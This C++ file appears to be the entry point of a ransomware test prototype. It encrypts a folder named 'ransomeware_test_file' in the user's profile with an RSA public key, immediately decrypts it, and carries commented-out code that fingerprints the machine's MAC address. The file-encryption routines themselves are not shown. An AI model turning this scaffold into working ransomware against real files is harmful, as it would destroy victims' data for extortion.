#define _CRT_SECURE_NO_WARNINGS

#include <WinSock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h> // IP Helper 라이브러리
#include <iostream>
#include <vector>
#include <openssl/applink.c>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include "framework.h"
#include "client.h"
#include "rsa.hpp"
#include "fileEnc.hpp"

using namespace std;

#pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
#pragma comment(lib, "IPHLPAPI.lib") // IP Helper 라이브러리
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

#define DEFAULT_PORT "8080"
string userName;


int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
    string filename = "C:\\Users";

    userName = getUserName();
    filename += "\\" + userName + "\\ransomeware_test_file";
    cout << "username: " << userName << endl;
    cout << endl;

    RSA* pubKey = getPubKey();
    EncryptDir(pubKey, filename);
    RSA_free(pubKey);
    

    RSA* priKey = getPriKey();
    DecryptDir(priKey, filename);
    RSA_free(priKey);
    return 0;
}




//cout << GetMacAddress() << endl;
// MAC 주소 가져오는 함수
//std::string GetMacAddress() {
//    ULONG ulOutBufLen = 0;
//    PIP_ADAPTER_INFO pAdapterInfo = NULL;
//    std::string macAddress = "";
//
//    // GetAdaptersInfo 호출하여 버퍼의 크기 가져오기
//    if (GetAdaptersInfo(NULL, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
//        // 버퍼 할당
//        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
//        if (pAdapterInfo == NULL) {
//            return macAddress;
//        }
//
//        // 어댑터 정보 가져오기
//        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
//            // 첫 번째 어댑터의 MAC 주소 가져오기
//            if (pAdapterInfo->AddressLength > 0) {
//                for (DWORD i = 0; i < pAdapterInfo->AddressLength; i++) {
//                    // MAC 주소를 16진수 문자열로 변환하여 macAddress에 저장
//                    char temp[3];
//                    sprintf_s(temp, "%02X", (int)pAdapterInfo->Address[i]);
//                    macAddress += temp;
//
//                    // MAC 주소 구분자 (:) 추가
//                    if (i < pAdapterInfo->AddressLength - 1) {
//                        macAddress += ":";
//                    }
//                }
//            }
//        }
//
//        // 할당된 메모리 해제
//        free(pAdapterInfo);
//    }
//
//    return macAddress;
//}
